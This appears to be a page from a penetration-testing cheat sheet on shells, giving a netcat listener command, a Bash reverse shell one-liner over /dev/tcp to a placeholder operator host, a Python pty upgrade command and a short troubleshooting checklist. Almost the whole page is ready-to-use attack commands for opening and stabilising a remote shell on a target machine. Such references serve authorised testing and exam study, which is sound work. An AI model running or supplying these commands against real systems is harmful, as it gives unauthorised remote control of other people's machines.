---
title: Shells
order: 1
tags: [shell, listener, bash, netcat, pty]
---

## Listeners

Run on the operator machine before the target connects.

```bash
nc -lvn {{LPORT}}
```

This is OpenBSD netcat syntax. Other variants differ; this variant does not combine -l with -p. [Manual](https://man.openbsd.org/nc).

## Bash reverse shell

Run on the Unix target. Requires Bash, its TCP redirections and an outbound route to the listener.

```bash
bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'
```

LHOST is the operator address reachable from the target. [Supplied command](https://github.com/BuilderGoh/OSCP-Master-Cheatsheet), [Bash redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html).

## Upgrading a shell

Requires Python 3 and /bin/bash on the Unix target.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This creates a pseudo-terminal; it does not configure the operator's terminal. [Python pty](https://docs.python.org/3/library/pty.html).

## Shell connection failure

- [ ] Confirm [listener](shells/shells#listeners), reachable LHOST and matching LPORT.
- [ ] Separate a connection failure from a command quoting or runtime failure.
- [ ] If direct access is unavailable, check the [pivot path](pivoting/tunnelling#tunnel-troubleshooting).

TODO: verify target egress and the available shell/runtime before selecting another payload.
